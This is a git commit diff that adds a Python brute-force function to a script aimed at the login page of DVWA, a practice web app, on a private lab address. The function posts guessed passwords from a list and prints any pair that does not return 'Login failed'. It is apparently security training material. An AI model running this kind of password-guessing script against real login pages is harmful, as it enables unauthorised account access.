7af9ff028a1295c560aa8ed4e1eb3b0e084da7ea
qwe123kids <qwe123kids@gmail.com>
2023-04-02 20:20:07 -0600

    brute force login page metasploit

--- bruteforce/bruteforce.py
+++ bruteforce/bruteforce.py
@@ -1,5 +1,18 @@
 #!/usr/bin/python
 import requests
+
+def bruteforce(username, page_url):
+    for password in passwords:
+        password = password.strip()
+        print("Trying to bruteforce with password " + password)
+        data_dictionary = {"username": username, "password": password, "Login":"submit"}
+        response = requests.post(page_url, data=data_dictionary)
+        if "Login failed".encode('utf-8') in response.content:
+            pass
+        else:
+            print("+ Username --> " + username + " Password " + password)
+
+
 page_url = "http://192.168.0.20/dvwa/login.php"
 username = input(" enter User Name for speecified page : ")
 
